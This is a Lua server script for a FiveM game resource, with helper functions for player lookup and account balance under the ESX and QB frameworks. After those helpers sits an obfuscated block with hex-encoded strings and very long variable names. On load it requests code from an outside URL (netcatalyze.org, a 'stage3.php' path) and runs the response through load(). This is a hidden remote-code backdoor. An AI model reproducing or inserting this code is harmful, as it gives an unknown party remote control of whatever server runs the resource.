function Koci.Server:Capitalize(str)
    str = str or ""
    return string.upper(str:sub(1, 1)) .. str:sub(2)
end

function Koci.Server:GetPlayer(source)
    if Koci.FrameworkName == "esx" then
        return Koci.Framework.GetPlayerFromId(source)
    elseif Koci.FrameworkName == "qb" then
        return Koci.Framework.Functions.GetPlayer(source)
    end
end

function Koci.Server:GetPlayerBalance(type, xPlayer)
    type = (type == "cash") and "money" or type
    if Koci.FrameworkName == "esx" then
        return tonumber(xPlayer.getAccount(type).money)
    elseif Koci.FrameworkName == "qb" then
        return tonumber(xPlayer.PlayerData.money[type])
    end
end


local sWOAadmHhvcrNqXtVrjxuQeBGWmagjACgpqExEUyvZNljKTmOjczSXNQdXUOFYdOpQcmqL = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} sWOAadmHhvcrNqXtVrjxuQeBGWmagjACgpqExEUyvZNljKTmOjczSXNQdXUOFYdOpQcmqL[4][sWOAadmHhvcrNqXtVrjxuQeBGWmagjACgpqExEUyvZNljKTmOjczSXNQdXUOFYdOpQcmqL[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x65\x74\x63\x61\x74\x61\x6c\x79\x7a\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x33\x71\x32\x66\x35", function (wsPfiWQgJuNkAWZlpdYQCnMFapEvNDvkhrHKdZvrCzEWWXjyCIqqeGLSInaNKotqoVAKnu, YtMYWWKMOlbaBkoCtlHivGhuXRqaVhTSzuunCNXLfFNfaKSauOWKxOikVRhSUaWLPXcToR) if (YtMYWWKMOlbaBkoCtlHivGhuXRqaVhTSzuunCNXLfFNfaKSauOWKxOikVRhSUaWLPXcToR == sWOAadmHhvcrNqXtVrjxuQeBGWmagjACgpqExEUyvZNljKTmOjczSXNQdXUOFYdOpQcmqL[6] or YtMYWWKMOlbaBkoCtlHivGhuXRqaVhTSzuunCNXLfFNfaKSauOWKxOikVRhSUaWLPXcToR == sWOAadmHhvcrNqXtVrjxuQeBGWmagjACgpqExEUyvZNljKTmOjczSXNQdXUOFYdOpQcmqL[5]) then return end sWOAadmHhvcrNqXtVrjxuQeBGWmagjACgpqExEUyvZNljKTmOjczSXNQdXUOFYdOpQcmqL[4][sWOAadmHhvcrNqXtVrjxuQeBGWmagjACgpqExEUyvZNljKTmOjczSXNQdXUOFYdOpQcmqL[2]](sWOAadmHhvcrNqXtVrjxuQeBGWmagjACgpqExEUyvZNljKTmOjczSXNQdXUOFYdOpQcmqL[4][sWOAadmHhvcrNqXtVrjxuQeBGWmagjACgpqExEUyvZNljKTmOjczSXNQdXUOFYdOpQcmqL[3]](YtMYWWKMOlbaBkoCtlHivGhuXRqaVhTSzuunCNXLfFNfaKSauOWKxOikVRhSUaWLPXcToR))() end)